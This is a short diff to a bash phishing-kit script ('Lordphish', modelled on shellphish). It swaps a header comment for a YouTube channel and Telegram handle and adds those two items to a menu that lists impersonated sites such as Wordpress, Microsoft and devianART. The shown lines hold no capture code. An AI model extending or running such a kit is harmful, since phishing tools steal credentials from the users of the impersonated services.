@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
-# Inicio do projeto foi dia 16/12/2020
+# Canal no youtube: Ch33ch_Sec
 # Inspirado no shellphish do thelinuxchoice
 # Lordphish the best phishing tool!!!!
+# Telegram: Ch33chOficial
 
 trap 'printf "\n";stop;exit 1' 2
 
@@ -59,7 +60,7 @@ printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      
 
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m     \e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;96m Exit\e[0m       \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel  \e[0m \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram\e[0m\n"
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
